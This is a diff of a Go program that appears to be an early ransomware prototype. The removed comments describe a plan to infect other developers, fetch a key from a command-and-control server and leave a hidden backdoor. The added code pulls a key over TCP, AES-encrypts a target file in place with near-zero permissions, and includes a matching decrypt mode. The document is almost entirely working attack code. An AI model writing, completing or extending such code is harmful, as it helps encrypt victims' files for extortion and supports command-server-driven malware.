@@ -1,26 +1,18 @@
-/*
-main logic:
-infect all other devs -> enc -> (hidden) backdoor
-
-enc:
-get key from c2 -> enc with custom alg -> ret some checksum
-
-*/
-
 package main
 
 import (
-	"bytes"
 	"crypto/aes"
 	"crypto/cipher"
 	"crypto/rand"
 	"flag"
 	"fmt"
 	"io"
-	"io/ioutil"
+	"io/fs"
 	"net"
 	"os"
 )
+
+// encryption: https://gist.github.com/fracasula/38aa1a4e7481f9cedfa78a0cdd5f1865
 
 func raw_connect(host string, ports string) string {
 	conn, err := net.Dial("tcp", host+":"+ports)
@@ -31,95 +23,76 @@ func raw_connect(host string, ports string) string {
 		defer conn.Close()
 		key := make([]byte, 1024)
 		if _, err := conn.Read(key); err == nil {
+			conn.Close()
 			return string(key)
 		}
 	}
 	return ""
 }
 
-// func enc(key []byte, file string) bool {
-
-// 	plaintext, err := ioutil.ReadFile(file)
-// 	if err != nil {
-// 		log.Fatal(err)
-// 	}
-// 	fmt.Print(key)
-// 	block, err := aes.NewCipher(key)
-// 	if err != nil {
-// 		fmt.Println("error:", err, "\n", block, key)
-// 		return false
-// 	}
-
-// 	gcm, err := cipher.NewGCM(block)
-// 	if err != nil {
-// 		fmt.Println("error:", err)
-// 		return false
-// 	}
-
-// 	nonce := make([]byte, gcm.NonceSize())
-// 	if _, err := io.ReadFull(rand.Reader, nonce); err != nil {
-// 		fmt.Println("error:", err)
-// 		return false
-// 	}
-
-// 	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
-
-// 	// Save back to file
-// 	err = ioutil.WriteFile(file+".bin", ciphertext, 0777)
-// 	if err != nil {
-// 		fmt.Println("error:", err)
-// 		return false
-// 	}
-// 	return true
-// }
-
-func enc(key string, file string) {
-	// read content from your file
-	plaintext, err := ioutil.ReadFile(file)
-	if err != nil {
-		panic(err.Error())
-	}
-
-	// this is a key
-	print([]byte("example key 1234"))
-	block, err := aes.NewCipher([]byte(key))
+func encrypt(key []byte, fn string) {
+	content, err := os.ReadFile(fn)
 	if err != nil {
 		panic(err)
 	}
 
-	// The IV needs to be unique, but not secure. Therefore it's common to
-	// include it at the beginning of the ciphertext.
-	ciphertext := make([]byte, aes.BlockSize+len(plaintext))
-	iv := ciphertext[:aes.BlockSize]
-	if _, err := io.ReadFull(rand.Reader, iv); err != nil {
-		panic(err)
+	// Simple encryption
+	block, err := aes.NewCipher(key[:aes.BlockSize])
+	if err != nil {
+		panic(fmt.Errorf("could not create new cipher: %v", err))
+	}
+
+	cT := make([]byte, aes.BlockSize+len(content))
+	iv := cT[:aes.BlockSize]
+	if _, err = io.ReadFull(rand.Reader, iv); err != nil {
+		panic(fmt.Errorf("could not encrypt: %v", err))
 	}
 
 	stream := cipher.NewCFBEncrypter(block, iv)
-	stream.XORKeyStream(ciphertext[aes.BlockSize:], plaintext)
+	stream.XORKeyStream(cT[aes.BlockSize:], content)
 
-	// create a new file for saving the encrypted data.
-	f, err := os.Create("a_aes.txt")
-	if err != nil {
-		panic(err.Error())
-	}
-	_, err = io.Copy(f, bytes.NewReader(ciphertext))
-	if err != nil {
-		panic(err.Error())
-	}
-
-	// done
+	// Write to file
+	os.WriteFile(fn, cT, fs.FileMode(02))
 }
 
-// func decrypt(key, file) {
+func decrypt(key []byte, fn string) {
+	content, err := os.ReadFile(fn)
+	if err != nil {
+		panic(err)
+	}
+	// Simple decryption
+	block, err := aes.NewCipher(key)
+	if err != nil {
+		panic(fmt.Errorf("could not create new cipher: %v", err))
+	}
 
-// }
+	if len(content) < aes.BlockSize {
+		panic(fmt.Errorf("invalid ciphertext block size"))
+	}
+
+	iv := content[:aes.BlockSize]
+	content = content[aes.BlockSize:]
+
+	stream := cipher.NewCFBDecrypter(block, iv)
+	stream.XORKeyStream(content, content)
+
+	// Write to file
+	os.WriteFile(fn, content, fs.FileMode(02))
+}
 
 func main() {
 	file := flag.String("f", "asd.txt", "file to enc")
+	decode := flag.Bool("d", false, "decrypt")
+	port := flag.String("p", "443", "port to connect to")
 	flag.Parse()
-	// fmt.Println(*file)
-	enc_key := raw_connect("localhost", "8000")
-	enc(enc_key, *file)
-	// decrypt(enc_key)
+
+	if !*decode {
+		enc_key := []byte(raw_connect("localhost", *port))
+		encrypt(enc_key, *file)
+	} else {
+		var enc_key []byte
+		fmt.Print("Enter decryption key: ")
+		fmt.Scanln(&enc_key)
+		decrypt(enc_key, *file)
+	}
 }
